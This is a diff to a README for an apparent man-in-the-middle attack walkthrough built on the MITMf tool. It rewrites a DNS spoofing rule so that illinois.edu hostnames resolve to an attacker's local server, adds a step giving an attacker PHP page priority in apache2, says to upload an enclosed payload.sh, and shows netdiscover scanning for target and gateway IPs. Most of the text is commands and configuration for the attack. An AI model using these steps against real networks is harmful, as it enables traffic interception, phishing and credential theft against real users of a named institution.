@@ -34,7 +34,9 @@ cd ~;git clone https://github.com/byt3bl33d3r/MITMf; cd MITMf/;git submodule ini
 ```
 2. Change the /etc/mitmf/mitmf.conf file, add the following line below the IPv4 address record line
 ```
-*.google.com=LOCALHOST_IP_IN_THE_TARGET_NETWORK/PATH_TO_PHP.php
+*.illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
+www.illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
+illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
 ```
 3. Create the php file, Code I used is 
 ```
@@ -44,7 +46,8 @@ echo $result;
 ?>
 <a href="https://www.google.com">Continue to Google</a>
 ```
-4. Update the payload.sh enclosed
+3.1 Make sure index.php has highest priority in apache2 (over index.html)
+4. Upload the payload.sh enclosed
 5. find the target IP and gateway IP
 ```
 netdiscover -i wlan0 192.168.1.1/24
